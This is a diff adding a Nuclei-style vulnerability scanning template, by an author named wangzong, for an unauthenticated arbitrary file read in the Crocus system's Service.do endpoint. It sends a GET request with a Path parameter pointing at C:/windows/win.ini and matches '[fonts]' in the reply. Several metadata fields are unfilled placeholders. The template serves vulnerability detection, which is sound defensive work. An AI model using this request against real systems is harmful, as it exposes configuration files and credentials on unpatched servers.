@@ -1,0 +1,20 @@
+id: Crocus-Service-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 锐明技术Crocus系统 Service.do接口存在任意文件读取漏洞，未经过身份验证的远程攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://
+  tags: tags
+  
+http:  
+  - method: GET
+    path:
+      - "{{BaseURL}}/Service.do?Action=Download&Path=C:/windows/win.ini"
+      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[fonts]'
